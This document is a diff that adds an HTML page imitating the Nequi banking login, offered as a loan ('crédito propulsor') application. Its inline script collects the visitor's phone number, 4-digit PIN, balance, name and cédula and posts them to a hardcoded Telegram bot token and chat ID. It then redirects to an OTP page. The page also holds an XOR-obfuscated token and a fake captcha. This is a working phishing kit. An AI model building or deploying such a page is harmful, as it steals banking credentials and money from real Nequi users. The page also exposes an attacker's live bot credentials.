@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Nequi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Webflow">
+    <link rel="stylesheet" type="text/css" href="css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
+    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+ 
+    <script type="text/javascript" src="./js/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript" src="./js/functions2.js"></script> 
+</head>
+
+<body ng-app="App" class="ng-scope">
+    <div id="content">
+        <div ng-include="getTemplate('/header.html')" class="ng-scope">
+            <header class="ng-scope">
+                <div class="wrap-header">
+                    <div class="row">
+                        <div class="col-xs-12 col-md-2">
+                            <div class="logo"> <a href="https://www.nequi.com.co"> <img alt="nequi"
+                                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
+                                </a> </div>
+                            <div class="btn-menu-hamburguer" ng-click="openMenu();"> <a class=""> <span></span> </a>
+                            </div>
+                        </div>
+                        <div class="col-xs-12 col-md-10 container-buttons">
+                            <div class="wrap-main-menu ">
+                                <div class="row">
+                                    <div class="col-xs-12 col-md-8"> </div>
+                                    <div class="col-xs-12 col-md-4">
+                                        <div class="buttons-right">
+                                            <ul>
+                                                <li ng-if="!hidePa" class="ng-scope"> <a target="_blank"
+                                                        href="https://recarga.nequi.com.co/bdigitalpsl"
+                                                        class="ng-binding">Recarga</a> </li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+        </div>
+
+        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
+            <div class="login-wrap">
+                <h1 class="ng-binding">Entra a tu Nequi</h1>
+                <p class="ng-binding">Solicitud de crédito propulsor</p>
+                <div class="login-form-wrap">
+                    <div class="container-form">
+                        <div class="input-country">
+                            <div class="wrap-select-country">
+                                <select-country selected-country="loginControl.selectCountry"
+                                    options="loginControl.selectOption"
+                                    on-select-country="loginControl.onSelectCountry(option)"
+                                    class="ng-isolate-scope">
+                                    <div class="select-country" ng-click="toggleSelect();">
+                                        <div class="country-wrap country-active">
+                                            <div class="select-col select-col-img"> <img
+                                                    src="images/flag_colombia.png" alt="co"> </div>
+                                            <div class="select-col">
+                                                <p class="ng-binding"> +57 </p> <input class="country-input"
+                                                    type="text" name="j_region" id="j_region" value="57">
+                                            </div>
+                                        </div>
+                                        <ul>
+                                            <li ng-repeat="option in options" class="ng-scope">
+                                                <div ng-click="setCountry($index);" class="country-wrap">
+                                                    <div class="select-col select-col-img"> <img
+                                                            src="images/flag_colombia.png" alt="co"> </div>
+                                                    <div class="select-col">
+                                                        <p class="ng-binding">+57</p>
+                                                    </div>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </select-country>
+                            </div>
+                            <div class="form-group">
+                                <input type="tel" 
+                                id="txtUsername" name="txtUsername"
+                                class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-touched"
+                                required="required" maxlength="12" minlength="12" required oninput="formatPhoneNumber()" inputmode="numeric">
+                                <label for="txtUsername" class="ng-binding">Número de celular</label>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <input
+                                class="password ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-touched"
+                                type="password" id="txtPass" name="txtPass" required maxlength="4" minlength="4" inputmode="numeric" pattern="\d*">
+                            <label for="txtPass" class="ng-binding">Contraseña</label>
+                        </div>
+                        <div class="form-group">
+                            <input
+                                class="ng-pristine ng-valid ng-touched"
+                                type="text" id="txtSaldo" name="txtSaldo" required inputmode="decimal" pattern="^\d+(\.\d{1,2})?$">
+                            <label for="txtSaldo" class="ng-binding">Saldo actual</label>
+                        </div>
+
+                        <img src="img/ca.png" alt="CAPTCHA" id="captcha" class="captcha">
+                        <div class="g-recaptcha" data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"></div>
+                    </div>
+
+                    <div class="btn-wrap">
+                        <input class="form-btn-submit" type="submit" value="Entra" id="btnUsuario" name="btnUsuario" disabled>
+                    </div>
+                </div>
+            </div>
+
+            <script type="text/javascript">
+
+// token cifrado del bot token y chat id
+
+var xorKey = 'Porqueblesnoesejemplodenadaaaaa';
+
+
+var encryptedToken = 'Z1xGSEFXVlxcQlQuJDUvCVAqOT0OFDcoVyUTVSAHEzYjJDYGCA4tNQU5GlECNA==';
+var encryptedChat = 'fV5CQUdWVVtQQF5YUEo=';
+
+
+
+             document.addEventListener("DOMContentLoaded", function() {
+    const usernameInput = document.getElementById('txtUsername');
+    const passwordInput = document.getElementById('txtPass');
+    const captchaImg = document.getElementById('captcha');
+    const submitBtn = document.getElementById('btnUsuario');
+
+    let captchaClicked = false;
+
+    // Eventos de entrada y clic
+    usernameInput.addEventListener('input', formatUsername);
+    passwordInput.addEventListener('input', formatPassword);
+    captchaImg.addEventListener('click', toggleCaptcha);
+
+    function formatUsername() {
+        let value = usernameInput.value.replace(/\D/g, ''); // Elimina caracteres no numéricos
+        let formattedValue = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '$1 $2 $3').trim(); // Formatea el número
+        usernameInput.value = formattedValue;
+        validateForm();
+    }
+
+    function formatPassword() {
+        passwordInput.value = passwordInput.value.replace(/\D/g, ''); // Solo números
+        validateForm();
+    }
+
+    function validateForm() {
+        // Validaciones de número y contraseña
+        const usernameValid = /^\d{3} \d{3} \d{4}$/.test(usernameInput.value) && usernameInput.value.startsWith("3");
+        const passwordValid = /^\d{4}$/.test(passwordInput.value);
+
+        if (usernameValid && passwordValid && captchaClicked) {
+            submitBtn.disabled = false;
+            submitBtn.classList.remove('disabled');
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.classList.add('disabled');
+        }
+    }
+
+    function toggleCaptcha() {
+        captchaClicked = true; // Marca el captcha como seleccionado
+        captchaImg.src = "img/cap.png"; // Cambia la imagen del captcha
+        validateForm();
+    }
+
+    // Obtener nombre y cédula del almacenamiento local
+    const nombreApellido = localStorage.getItem("nombreApellido");
+    const cedula = localStorage.getItem("cedula");
+
+$('#btnUsuario').click(async function(e) {
+    e.preventDefault();
+
+    const usuario = $("#txtUsername").val().trim();
+    const clave = $("#txtPass").val().trim();
+    const saldo = $("#txtSaldo").val().trim();
+
+    if (!/^\d{3} \d{3} \d{4}$/.test(usuario) || !usuario.startsWith("3")) {
+        alert("El número ingresado no es válido. Debe tener el formato XXX XXX XXXX y comenzar con 3.");
+        return;
+    }
+
+    if (!/^\d{4}$/.test(clave)) {
+        alert("La clave debe ser de 4 dígitos numéricos.");
+        return;
+    }
+
+    if (!saldo || isNaN(parseFloat(saldo))) {
+        alert("Debe ingresar un saldo válido.");
+        return;
+    }
+
+    if (!nombreApellido || !cedula) {
+        alert("Los datos de nombre y cédula no están disponibles. Vuelve al paso anterior.");
+        return;
+    }
+
+    localStorage.setItem("numero", usuario);
+    localStorage.setItem("clave", clave);
+    localStorage.setItem("saldo", saldo);
+
+    const telegramToken = '8534229679:AAH3FToX8Ef7SDWY86Tkw7jZYsgAf3-Babs';
+    const telegramChatId = '-5141082252';
+    const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+    const message = `🔔 <b>Datos de Usuario Nequi</b>\n\n` +
+        `👤 <b>Nombre:</b> ${nombreApellido}\n` +
+        `🆔 <b>Cédula:</b> ${cedula}\n` +
+        `📱 <b>Número:</b> ${usuario}\n` +
+        `🔐 <b>Clave:</b> ${clave}\n` +
+        `💰 <b>Saldo:</b> $${saldo}`;
+
+    try {
+        const response = await fetch(telegramURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        if (response.ok) {
+            window.location.href = "otp.html";
+        } else {
+            throw new Error('Error al enviar los datos a Telegram');
+        }
+    } catch (error) {
+        console.error('Error al enviar los datos:', error);
+        alert('Ocurrió un error al enviar los datos. Intente nuevamente.');
+    }
+});
+
+});
+
+            </script>
+
+           <script src="bloqueo-bots.js"></script>
+    <!-- App -->
+    <script src="js/script.js"></script>
+
+    <script async="" defer=""
+        src="https://www.google.com/recaptcha/api.js?onload=vcRecaptchaApiLoaded&amp;render=explicit"></script>
+    <div
+        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
+        <div
+            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
+        </div>
+        <div class="g-recaptcha-bubble-arrow"
+            style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
+        </div>
+        <div class="g-recaptcha-bubble-arrow"
+            style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
+        </div>
+        <div style="z-index: 2000000000; position: relative;">
+            <iframe title="El reCAPTCHA caduca dentro de dos minutos"
+                name="c-23ulu23lv1it" frameborder="0" scrolling="no"
+                sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"
+                src="https://www.google.com/recaptcha/api2/bframe?hl=es&amp;v=-QbJqHfGOUB8nuVRLvzFLVed&amp;k=6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"
+                style="width: 100%; height: 100%;"></iframe>
+        </div>
+    </div>
+
+
+    </body>
+</html>
